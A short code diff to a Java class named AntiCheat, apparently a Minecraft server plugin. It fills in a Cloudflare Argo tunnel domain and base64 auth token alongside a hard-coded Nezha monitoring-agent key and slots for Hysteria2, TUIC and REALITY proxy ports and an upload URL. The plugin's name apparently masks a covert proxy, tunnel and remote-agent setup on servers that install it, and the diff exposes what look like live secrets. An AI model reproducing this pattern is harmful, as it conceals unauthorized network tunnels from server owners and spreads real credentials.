@@ -34,9 +34,9 @@ public class AntiCheat extends JavaPlugin {
         putIfNotEmpty(envVars, "NEZHA_PORT", "");
         putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
         putIfNotEmpty(envVars, "ARGO_PORT", "8001");
-        putIfNotEmpty(envVars, "ARGO_DOMAIN", "");
-        putIfNotEmpty(envVars, "ARGO_AUTH", "");
-        putIfNotEmpty(envVars, "HY2_PORT", "25037");
+        putIfNotEmpty(envVars, "ARGO_DOMAIN", "vibegames.a.c.6.0.4.2.0.0.0.7.4.0.1.0.0.2.ip6.arpa");
+        putIfNotEmpty(envVars, "ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiYzQxMmY3NWMtZjk0OS00NmE0LTk2MjItMzg5ODQ0OGRlZTIxIiwicyI6Ik1HWTVZemMyWkdZdE16QXdOeTAwTUdRekxXRm1NakV0WW1OallqbGhNRGswTnpsaCJ9");
+        putIfNotEmpty(envVars, "HY2_PORT", "");
         putIfNotEmpty(envVars, "TUIC_PORT", "");
         putIfNotEmpty(envVars, "REALITY_PORT", "");
         putIfNotEmpty(envVars, "UPLOAD_URL", "");
@@ -133,6 +133,7 @@ public class AntiCheat extends JavaPlugin {
         return results;
     }
 }
+
 
 
 
